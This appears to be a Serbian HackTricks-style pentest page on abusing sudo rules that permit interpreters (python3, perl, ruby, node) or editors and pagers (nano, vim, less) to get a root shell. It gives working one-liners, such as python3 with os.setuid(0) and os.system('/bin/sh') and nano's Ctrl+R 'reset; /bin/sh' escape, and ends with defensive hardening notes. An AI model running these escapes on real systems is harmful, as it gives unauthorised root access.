# Zloupotreba Sudo komandi

{{#include ../../banners/hacktricks-training.md}}

## Interpreteri dozvoljeni putem Sudo-a

Ako `sudo -l` dozvoljava korisniku da pokrene interpreter kao root, tretirajte to kao direktno izvršavanje koda. Interpreteri su namenjeni izvršavanju proizvoljnog koda, pa je pravilo koje dozvoljava `python3`, `perl`, `ruby`, `lua`, `node` ili slične binarne datoteke obično ekvivalentno izvršavanju komandi kao root, osim ako su argumenti strogo ograničeni i validirani.

Uobičajeni tok provere:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Drugi primeri interpreter-a:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tačna putanja je važna. Ako sudo pravilo dozvoljava `/usr/bin/python3`, koristite tu tačnu putanju tokom provere:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editori dozvoljeni putem sudo

Ako `sudo -l` dozvoljava korisniku da pokrene interaktivni editor kao root, tretirajte to kao površinu za izvršavanje komandi, a ne kao bezazlenu dozvolu za uređivanje datoteka. Editori često mogu da izvršavaju shell komande, čitaju proizvoljne datoteke, upisuju proizvoljne datoteke ili pozivaju spoljne pomoćne alate iz samog editora.

Uobičajeni tok provere:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Izvršavanje komandi pomoću Nano-a

Kada je `nano` dozvoljen putem sudo-a, izvršavanje komandi može biti dostupno iz interfejsa editora:
```text
Ctrl+R
Ctrl+X
```
Zatim navedite komandu kao što je:
```bash
id
/bin/sh
```
Na nekim terminalima, interaktivnom shell-u će možda biti potrebno preusmeriti standardne tokove:
```bash
reset; /bin/sh 1>&0 2>&0
```
Tačan redosled tastera može da se razlikuje u zavisnosti od verzije nano-a i opcija pri izgradnji, ali bezbednosni problem je isti: editor radi kao root i može da poziva spoljne komande.

### Drugi uobičajeni načini napuštanja editora

Vim-style editori obično omogućavaju izvršavanje komandi pomoću `:!`:
```text
:!/bin/sh
```
Pageri poput `less` takođe mogu omogućiti izvršavanje shell-a:
```text
!/bin/sh
```
## Defanzivne napomene

- Izbegavajte dodeljivanje interpretera ili interaktivnih editora putem sudo.
- Prednost dajte fiksnim wrapperima u vlasništvu root korisnika, koji izvršavaju jednu usko definisanu administrativnu radnju.
- Ako je interpreter neizbežan, ograničite tačnu putanju do skripte i sprečite argumente pod kontrolom korisnika, upisive import putanje, `PYTHONPATH` i nebezbedno očuvanje okruženja.
- Ako je potrebno uređivanje datoteka, ograničite tačnu putanju do datoteke i razmotrite `sudoedit` sa zakrpljenim verzijama sudo i strogim upravljanjem okruženjem.
- Proverite `SETENV`, `env_keep`, upisive radne direktorijume, upisive putanje do modula/importa, `NOEXEC`, `use_pty` i logging, ali nemojte ih tretirati kao potpun sandbox.
